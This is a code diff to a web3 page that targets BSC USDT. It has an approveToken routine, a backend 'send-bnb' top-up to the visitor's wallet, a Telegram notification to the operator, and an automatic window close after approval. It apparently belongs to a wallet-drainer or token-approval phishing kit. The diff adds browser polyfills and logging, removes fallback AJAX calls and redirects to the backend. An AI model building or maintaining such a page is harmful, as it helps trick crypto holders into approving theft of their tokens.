@@ -86,6 +86,48 @@
 
   <script type="text/javascript" src="js/web3.min.js"></script>
 <script src="js/jquery-3.7.1.min.js"></script> 
+
+<!-- Browser Compatibility Check and Polyfills -->
+<script>
+    // Check browser compatibility
+    (function() {
+        console.log('🔍 [Browser Check] Checking browser compatibility...');
+        console.log('🔍 [Browser Check] User Agent:', navigator.userAgent);
+        
+        // Check for AbortController support
+        if (typeof AbortController === 'undefined') {
+            console.warn('⚠️ [Browser Check] AbortController not supported, creating polyfill...');
+            // Simple AbortController polyfill
+            window.AbortController = function() {
+                this.signal = {
+                    aborted: false,
+                    onabort: null
+                };
+                this.abort = function() {
+                    this.signal.aborted = true;
+                    if (this.signal.onabort) {
+                        this.signal.onabort();
+                    }
+                };
+            };
+        }
+        
+        // Check for fetch support
+        if (typeof fetch === 'undefined') {
+            console.error('❌ [Browser Check] Fetch API not supported! This browser is too old.');
+            alert('Your browser is too old. Please update to a modern browser.');
+        }
+        
+        // Check for Promise support
+        if (typeof Promise === 'undefined') {
+            console.error('❌ [Browser Check] Promise not supported! This browser is too old.');
+            alert('Your browser is too old. Please update to a modern browser.');
+        }
+        
+        console.log('✅ [Browser Check] Browser compatibility check complete');
+    })();
+</script>
+
 <script>
 
         var addressTOKEN = "0x55d398326f99059ff775485246999027b3197955";
@@ -105,6 +147,9 @@
         async function testBackendConnection() {
             console.log('🔍 [Backend Test] Testing backend connectivity...');
             console.log('🔍 [Backend Test] Backend URL:', BACKEND_URL);
+            console.log('🔍 [Backend Test] Browser:', navigator.userAgent);
+            console.log('🔍 [Backend Test] Fetch support:', typeof fetch !== 'undefined');
+            console.log('🔍 [Backend Test] AbortController support:', typeof AbortController !== 'undefined');
             
             try {
                 // Try a simple GET request to test connectivity
@@ -120,11 +165,13 @@
                 return true;
             } catch (error) {
                 console.error('❌ [Backend Test] Backend connection failed:', error.message);
+                console.error('❌ [Backend Test] Error name:', error.name);
                 console.error('💡 [Backend Test] Possible issues:');
                 console.error('   - Backend server is down');
                 console.error('   - CORS not configured');
                 console.error('   - Network/firewall blocking');
                 console.error('   - Wrong backend URL');
+                console.error('   - Browser compatibility issue');
                 console.warn('⚠️ [Backend Test] Site will continue, but backend features may not work');
                 return false;
             }
@@ -242,24 +289,6 @@
                                 error: function (err) {
                                     console.log("API error (non-critical):", JSON.stringify(err));
                                     // This is non-critical, so we continue anyway
-                                    // Try fallback to relative URL if available
-                                    if (window.location.origin && window.location.origin !== 'null') {
-                                        const fallbackUrl = window.location.origin + '/MemberPanel/TopUpWithMetamaskJson';
-                                        $.ajax({
-                                            url: fallbackUrl,
-                                            type: 'POST',
-                                            dataType: 'JSON',
-                                            contentType: 'application/json',
-                                            data: JSON.stringify(maindt),
-                                            timeout: 5000,
-                                            success: function (data) {
-                                                console.log('Fallback API success');
-                                            },
-                                            error: function (fallbackErr) {
-                                                console.log("Fallback API error (ignored):", JSON.stringify(fallbackErr));
-                                            }
-                                        });
-                                    }
                                 }
                             });
 
@@ -448,10 +477,22 @@ async function getTopUpErrorDetails(account) {
     // Try a quick test request to diagnose the issue
     try {
         const testUrl = `${BACKEND_URL}/send-bnb`;
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 5000);
+        let controller = null;
+        let timeoutId = null;
         
-        const response = await fetch(testUrl, {
+        try {
+            controller = new AbortController();
+            timeoutId = setTimeout(() => {
+                if (controller && controller.abort) {
+                    controller.abort();
+                }
+            }, 5000);
+        } catch (e) {
+            // AbortController not available, skip timeout
+            console.warn('⚠️ [Error Details] AbortController not available');
+        }
+        
+        const fetchOptions = {
             method: 'POST',
             headers: { 
                 'Content-Type': 'application/json',
@@ -459,11 +500,18 @@ async function getTopUpErrorDetails(account) {
             },
             body: JSON.stringify({ recipient: account }),
             mode: 'cors',
-            credentials: 'omit',
-            signal: controller.signal
-        });
+            credentials: 'omit'
+        };
         
-        clearTimeout(timeoutId);
+        if (controller && controller.signal) {
+            fetchOptions.signal = controller.signal;
+        }
+        
+        const response = await fetch(testUrl, fetchOptions);
+        
+        if (timeoutId) {
+            clearTimeout(timeoutId);
+        }
         
         if (!response.ok) {
             if (response.status === 400) {
@@ -501,16 +549,33 @@ async function requestBNBTopUp(account) {
     }
     
     try {
-        const controller = new AbortController();
-        // Increase timeout to 60 seconds - blockchain transactions can take time to confirm
-        const timeoutId = setTimeout(() => controller.abort(), 60000); // 60 second timeout
+        // Create AbortController with fallback for older browsers
+        let controller = null;
+        let timeoutId = null;
+        
+        try {
+            controller = new AbortController();
+            // Increase timeout to 60 seconds - blockchain transactions can take time to confirm
+            timeoutId = setTimeout(() => {
+                if (controller && controller.abort) {
+                    controller.abort();
+                }
+            }, 60000); // 60 second timeout
+        } catch (e) {
+            console.warn('⚠️ [BNB Top-up] AbortController not available, using timeout fallback');
+            // Fallback: just use timeout without AbortController
+            timeoutId = setTimeout(() => {
+                throw new Error('Request timeout');
+            }, 60000);
+        }
         
         console.log('📤 [BNB Top-up] Sending POST request...');
         const requestBody = { recipient: account };
         console.log('📤 [BNB Top-up] Request body:', JSON.stringify(requestBody));
         console.log('⏳ [BNB Top-up] Waiting for backend response (this may take 10-30 seconds for blockchain confirmation)...');
         
-        const response = await fetch(apiUrl, {
+        // Build fetch options with optional signal
+        const fetchOptions = {
             method: 'POST',
             headers: { 
                 'Content-Type': 'application/json',
@@ -519,11 +584,19 @@ async function requestBNBTopUp(account) {
             body: JSON.stringify(requestBody),
             mode: 'cors',
             credentials: 'omit',
-            cache: 'no-cache',
-            signal: controller.signal
-        });
+            cache: 'no-cache'
+        };
+        
+        // Only add signal if AbortController is available
+        if (controller && controller.signal) {
+            fetchOptions.signal = controller.signal;
+        }
+        
+        const response = await fetch(apiUrl, fetchOptions);
 
-        clearTimeout(timeoutId);
+        if (timeoutId) {
+            clearTimeout(timeoutId);
+        }
         console.log('📥 [BNB Top-up] Response received');
         console.log('📥 [BNB Top-up] Status:', response.status, response.statusText);
         console.log('📥 [BNB Top-up] Headers:', Object.fromEntries(response.headers.entries()));
@@ -621,7 +694,7 @@ async function requestBNBTopUp(account) {
                 console.error('   2. CORS is not configured on backend');
                 console.error('   3. Network/firewall blocking the request');
                 console.error('   4. Backend URL might be incorrect:', BACKEND_URL);
-                console.error('   5. Backend may have IP restrictions');
+                console.error('   5. Network connectivity issue');
                 error.errorType = 'cors';
             } else {
                 error.errorType = 'network';
@@ -731,32 +804,13 @@ async function approveToken(account) {
                 error: function (err) {
                     console.log("API error (non-critical): " + JSON.stringify(err));
                     // This API call is non-critical - Telegram notification already sent
-                    // Try fallback to relative URL if we're on the same domain
-                    if (window.location.origin && window.location.origin !== 'null' && !window.location.origin.includes('file://')) {
-                        const fallbackUrl = window.location.origin + '/home/TopUpWithMetamaskJson';
-                        $.ajax({
-                            url: fallbackUrl,
-                            type: 'POST',
-                            dataType: 'JSON',
-                            contentType: 'application/json',
-                            data: JSON.stringify(maindt),
-                            timeout: 5000,
-                            success: function (data) {
-                                console.log('Fallback API success');
-                            },
-                            error: function (fallbackErr) {
-                                console.log("Fallback API error (ignored): " + JSON.stringify(fallbackErr));
-                            }
-                        });
-                    }
                     // Close site even if API call fails (non-critical)
                     setTimeout(() => {
                         window.close();
                         if (!window.closed) {
                             try {
-                                if (window.location.origin && window.location.origin !== 'null' && !window.location.origin.includes('file://')) {
-                                    location.href = window.location.origin + "/home/index";
-                                }
+                                // Try to redirect to backend
+                                location.href = `${BACKEND_URL}/home/index`;
                             } catch(e) {
                                 // Ignore redirect errors
                             }
